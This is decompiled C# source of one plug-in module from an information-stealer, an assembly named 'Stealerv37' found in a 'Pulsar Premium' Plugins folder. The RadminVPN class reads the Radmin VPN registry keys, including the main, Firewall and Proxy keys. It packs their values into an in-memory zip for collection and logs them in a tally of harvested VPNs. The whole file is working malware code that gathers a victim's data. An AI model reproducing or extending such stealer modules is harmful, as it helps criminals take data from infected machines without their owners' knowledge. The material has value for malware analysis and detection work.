// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.RadminVPN
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;

#nullable disable
namespace Intelix.Targets.Vpn;

public class RadminVPN : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    List<string> stringList = new List<string>();
    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN", false))
      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0", false))
      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Firewall", false))
      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Proxy", false))
      stringList.AddRange((IEnumerable<string>) RegistryParser.ParseKey(key));
    if (!stringList.Any<string>())
      return;
    string entryPath = "RadminVPN\\Registry.txt";
    zip.AddTextFile(entryPath, string.Join("\n", (IEnumerable<string>) stringList));
    counter.Vpns.Add(new Counter.CounterApplications()
    {
      Name = nameof (RadminVPN),
      Files = {
        "SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN => " + entryPath,
        "SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0 => " + entryPath,
        "SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Firewall => " + entryPath,
        "SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Proxy => " + entryPath,
        entryPath,
        "RadminVPN\\"
      }
    });
  }
}
